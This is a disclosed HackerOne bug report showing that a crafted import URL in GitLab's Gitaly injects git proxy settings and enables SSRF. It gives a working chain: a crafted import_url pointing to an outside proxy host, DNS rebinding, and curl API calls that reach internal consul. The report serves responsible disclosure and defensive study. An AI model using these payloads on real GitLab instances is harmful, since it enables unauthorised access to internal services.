# Injection of `http.<url>.*` git config settings leading to SSRF

## Report Details
- **Report ID**: 855276
- **URL**: https://hackerone.com/reports/855276
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-21T14:56:04.931Z
- **Disclosed**: 2020-09-08T13:46:02.172Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

When import a repo with credentials via a URL, gitaly generates the git clone command with a `-c` flag to add the Authorization header:

https://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37
```go
flags = append(flags, git.ValueFlag{Name: "-c", Value: fmt.Sprintf("http.%s.extraHeader=%s", u.String(), authHeader)})
```

Which will create a command such as:
```bash
git clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path
```

The issue is that the url can contain one of the http config values from https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt, which will result the user supplied config being set instead of `extraHeader` (with the `.extraHeader..` being appended to the value).

This allows an attacker to set things like `http.proxy` which can result in a SSRF if they use an import url such as `http://user@google.com/.proxy=http://proxy.aw.rs:8500`


### Steps to reproduce
1. Create a dns entry with a short TTL
1. Start a server listening on the port that you want to hit with the SSRF that always returns `200 OK`, something like {F797777}
1. Create a project with the specially crafted import url: `curl -H "Authorization: Bearer $TOKEN" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'`. This results in the following `.git/config` for the repo:

    ```bash
    sudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
    [core]
        repositoryformatversion = 0
        filemode = true
        bare = true
    [http]
        followredirects = false
    [http "http://google.com/"]
        proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==
    ```
1. Update the dns entry to point to `127.0.0.1` and wait for it to propergate
1. Add a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a `?` to make sure the appended paths are removed: `curl -H "Authorization: Bearer $TOKEN" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'`
1. Check the status of the import to see the result of the SSRF (in this case hitting consul on port 8500)
    ```bash
curl -H "Authorization: Bearer $TOKEN" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error`
"2:Fetching remote upstream failed: remote: method GET not allowed\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\n"
    ```

Git (via curl) allows for `socks4` and `socks5` proxies as well which could potentially be used to generated other SSRF payloads for things like redis or for leaking internal dns resolutions. There maybe other `http.*` configs that could be exploited, an interesting one is `http.cookieFile` but due to the appended `.extraHeader=` the path is not really controllable from my initial testing.

### Impact
* An attacker can set the `http.<url>.proxy` git config resulting in SSRF

### What is the current *bug* behavior?
The git http config propertied can be influenced by the import url

### What is the expected *correct* behavior?
Only the `extraHeader` config should be set via the git clone.

### Output of checks
#### Results of GitLab environment info
```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.2
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.4-ee
Revision:	6a1a8e88568
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

* An attacker can set the `http.<url>.proxy` git config resulting in SSRF

## Attachments
- proxy.py
